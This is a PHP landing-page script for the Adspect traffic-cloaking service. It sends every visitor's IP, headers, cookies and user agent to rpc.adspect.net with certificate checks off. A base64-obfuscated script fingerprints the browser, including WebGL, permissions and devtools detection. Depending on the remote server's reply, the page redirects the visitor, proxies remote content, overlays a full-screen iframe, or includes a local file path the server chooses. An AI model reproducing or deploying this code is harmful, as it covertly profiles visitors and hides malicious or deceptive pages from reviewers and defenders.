<?php
 define('ADSPECT_DEBUG', 0); if (ADSPECT_DEBUG) { ini_set('display_errors', '1'); error_reporting(E_ALL); } else { ini_set('display_errors', '0'); } if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect($sid, $mode) { $ajax = $mode === 'ajax'; $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' )); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = $headers; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-JS: ' . intval($ajax), 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); if ($errno = curl_errno($curl)) { if (ADSPECT_DEBUG) { die('cURL error: ' . curl_strerror($errno)); } header("{$proto} 500 Internal Server Error", true, 500); die; } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: text/html'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if ($ajax) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] === 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; if (adspect_coalesce($target, 'path') === '') { return null; } $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($mode === 'redirect' || !preg_match('/^https?:/i', $target)) { header("Location: {$target}"); } elseif ($mode === 'proxy') { $curl = curl_init(); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, $ua); curl_setopt($curl, CURLOPT_URL, $target); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $html = curl_exec($curl); curl_close($curl); $target = parse_url($target); $origin = $target['scheme'] . '://' . $target['host']; if (array_key_exists('port', $target)) { $origin .= ':' . $target['port']; } $dirurl = $origin . adspect_coalesce($target, 'path', '/'); $html = preg_replace('@(href|src)=(["\'])/(?!/)((?:(?!\2).)*)@i', "$1=$2{$origin}/$3", $html); $html = preg_replace('@(href|src)=(["\'])(?!(?:https?:)?//)((?:(?!\2).)*)@i', "$1=$2{$dirurl}/$3", $html); $html = preg_replace('@(href|src)=/(?!/)([^ ]*)@i', "$1={$origin}/$2", $html); $html = preg_replace('@(href|src)=(?!["\'])(?!(?:https?:)?//)([^ ]*)@i', "$1={$dirurl}/$2", $html); echo $html; } elseif ($mode === 'iframe') { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: if (ADSPECT_DEBUG) { die("cURL returned status code {$status}"); } header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 60); return $target; } } $target = adspect('1eb33dd7-aa39-615c-ad09-ac1f6b95a853', 'redirect'); if ($target === null) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,KGZ1bmN0aW9uKCl7ZnVuY3Rpb24gbCgpe2IuZXJyb3JzPWQ7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZm9ybSIpLGM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW5wdXQiKTthLm1ldGhvZD0iUE9TVCI7YS5hY3Rpb249d2luZG93LmxvY2F0aW9uLmhyZWY7Yy50eXBlPSJoaWRkZW4iO2MubmFtZT0iZGF0YSI7Yy52YWx1ZT1KU09OLnN0cmluZ2lmeShiKTthLmFwcGVuZENoaWxkKGMpO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7YS5zdWJtaXQoKX12YXIgZD1bXSxiPXt9O3RyeXt2YXIgZz1mdW5jdGlvbihhKXtpZigib2JqZWN0Ij09PXR5cGVvZiBhJiZudWxsIT09YSl7dmFyIGM9ZnVuY3Rpb24oayl7dHJ5e3ZhciBoPWFba107c3dpdGNoKHR5cGVvZiBoKXtjYXNlICJvYmplY3QiOmlmKG51bGw9PT1oKWJyZWFrO2Nhc2UgImZ1bmN0aW9uIjpoPWgudG9TdHJpbmcoKX1lW2tdPWh9Y2F0Y2gocil7ZC5wdXNoKHIubWVzc2FnZSl9fSxlPXt9LGY7Zm9yKGYgaW4gYSljKGYpOwp0cnl7dmFyIG09T2JqZWN0LmdldE93blByb3BlcnR5TmFtZXMoYSk7Zm9yKGY9MDtmPG0ubGVuZ3RoOysrZiljKG1bZl0pO2VbIiEhIl09bX1jYXRjaChrKXtkLnB1c2goay5tZXNzYWdlKX1yZXR1cm4gZX19O2Iud2luZG93PWcod2luZG93KTtiLnNjcmVlbj1nKHdpbmRvdy5zY3JlZW4pO2IuZG9jdW1lbnQ9Zyhkb2N1bWVudCk7Yi5kb2N1bWVudEVsZW1lbnQ9ZnVuY3Rpb24oYSl7dHJ5e3ZhciBjPXt9O2E9YS5hdHRyaWJ1dGVzO2Zvcih2YXIgZSBpbiBhKWU9YVtlXSxjW2Uubm9kZU5hbWVdPWUubm9kZVZhbHVlO3JldHVybiBjfWNhdGNoKGYpe2QucHVzaChmLm1lc3NhZ2UpfX0oZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50KTtiLm5hdmlnYXRvcj1nKHdpbmRvdy5uYXZpZ2F0b3IpO2Iud2ViYXNzZW1ibHk9Zyh3aW5kb3cuV2ViQXNzZW1ibHkpO3RyeXtiLnRpbWV6b25lT2Zmc2V0PShuZXcgRGF0ZSkuZ2V0VGltZXpvbmVPZmZzZXQoKX1jYXRjaChhKXtkLnB1c2goYS5tZXNzYWdlKX10cnl7Zz0KZnVuY3Rpb24oKXt9O3ZhciBwPTA7Zy50b1N0cmluZz1mdW5jdGlvbigpeysrcDtyZXR1cm4iIn07Y29uc29sZS5sb2coZyk7Yi50b3N0cmluZz1wfWNhdGNoKGEpe2QucHVzaChhLm1lc3NhZ2UpfXRyeXtiLnRvdWNoRXZlbnQ9ZG9jdW1lbnQuY3JlYXRlRXZlbnQoIlRvdWNoRXZlbnQiKS50b1N0cmluZygpfWNhdGNoKGEpe2QucHVzaChhLm1lc3NhZ2UpfXRyeXt2YXIgbj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCJ3ZWJnbCIpLHE9bi5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKTtiLndlYmdsPXt2ZW5kb3I6bi5nZXRQYXJhbWV0ZXIocS5VTk1BU0tFRF9WRU5ET1JfV0VCR0wpLHJlbmRlcmVyOm4uZ2V0UGFyYW1ldGVyKHEuVU5NQVNLRURfUkVOREVSRVJfV0VCR0wpfX1jYXRjaChhKXtkLnB1c2goYS5tZXNzYWdlKX13aW5kb3cubmF2aWdhdG9yLnBlcm1pc3Npb25zLnF1ZXJ5KHtuYW1lOiJub3RpZmljYXRpb25zIn0pLnRoZW4oZnVuY3Rpb24oYSl7Yi5wZXJtaXNzaW9ucz0KW3dpbmRvdy5Ob3RpZmljYXRpb24ucGVybWlzc2lvbixhLnN0YXRlXTtsKCl9LGwpfWNhdGNoKGEpe2QucHVzaChhLm1lc3NhZ2UpLGwoKX19KSgpOwo="></script>
</body>
</html>
<?php die;